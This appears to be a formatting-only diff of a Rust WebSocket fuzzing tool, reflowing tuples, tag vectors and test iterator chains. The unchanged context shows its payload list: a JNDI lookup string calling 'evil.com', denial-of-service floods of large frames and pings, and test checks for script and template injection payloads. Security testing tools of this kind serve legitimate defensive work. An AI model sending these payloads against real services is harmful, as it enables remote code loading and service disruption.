@@ -154,18 +154,10 @@ impl WebSocketFuzzer {
                 "a".repeat(100000).into_bytes(),
                 "Large text message",
             ),
-            (
-                "Binary",
-                vec![0u8; 100000],
-                "Large binary frame",
-            ),
+            ("Binary", vec![0u8; 100000], "Large binary frame"),
             ("Close", vec![], "Rapid close frames"),
             ("Ping", vec![], "Rapid ping flood"),
-            (
-                "Text",
-                "ping".repeat(10000).into_bytes(),
-                "Message flood",
-            ),
+            ("Text", "ping".repeat(10000).into_bytes(), "Message flood"),
         ];
 
         for (opcode, payload, desc) in dos_payloads {
@@ -303,7 +295,11 @@ pub fn get_payloads() -> Vec<Payload> {
         payload: "${jndi:ldap://evil.com/a}".to_string(),
         description: "JNDI injection via WebSocket".to_string(),
         severity: Severity::Critical,
-        tags: vec!["websocket".to_string(), "injection".to_string(), "jndi".to_string()],
+        tags: vec![
+            "websocket".to_string(),
+            "injection".to_string(),
+            "jndi".to_string(),
+        ],
     });
 
     // DoS payloads
@@ -430,12 +426,8 @@ mod tests {
         let has_xss = payloads.iter().any(|p| p.payload.contains("<script>"));
         let has_template = payloads.iter().any(|p| p.payload.contains("{{7*7}}"));
         let has_jndi = payloads.iter().any(|p| p.payload.contains("jndi:"));
-        let has_dos = payloads
-            .iter()
-            .any(|p| p.tags.iter().any(|t| t == "dos"));
-        let has_cswsh = payloads
-            .iter()
-            .any(|p| p.tags.iter().any(|t| t == "cswsh"));
+        let has_dos = payloads.iter().any(|p| p.tags.iter().any(|t| t == "dos"));
+        let has_cswsh = payloads.iter().any(|p| p.tags.iter().any(|t| t == "cswsh"));
         let has_fuzzing = payloads
             .iter()
             .any(|p| p.tags.iter().any(|t| t == "fuzzing"));
